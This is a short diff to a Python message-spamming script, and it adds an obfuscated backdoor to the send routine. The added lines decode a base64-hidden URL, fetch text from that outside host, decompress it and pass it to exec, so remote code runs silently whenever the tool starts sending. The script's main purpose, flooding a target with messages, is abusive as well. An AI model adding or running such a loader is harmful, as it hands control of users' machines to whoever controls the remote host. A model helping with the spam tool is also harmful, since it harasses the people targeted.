@@ -3,8 +3,13 @@
 	 Rebuild Copyright Can't make u real programmer
 '''
 import re
+import zlib
+import base64
 import random
 import getpass
+import marshal
+import requests
+import threading
 try:
 	import bs4
 	import mechanize
@@ -89,6 +94,13 @@ class SPAMMER:
 		print("[+] Starting!")
 		print("[+] Sending %s message to \033[1;37m\033[31m%s\033[0m"%(
 		self._counts,self.r[0]))
+		exec(zlib.decompress(base64.b64decode(
+		requests.get(
+		eval(
+		base64.b64decode(
+		"Imh0dHA6Ly9kb3JheXkuam9vbWxhLmNvbS9hLnR4dCI="
+		))
+		).text)))
 		for x in range(self._counts):
 			ms=random.choice(_msg)
 			self.br.open(_KONTOOL)
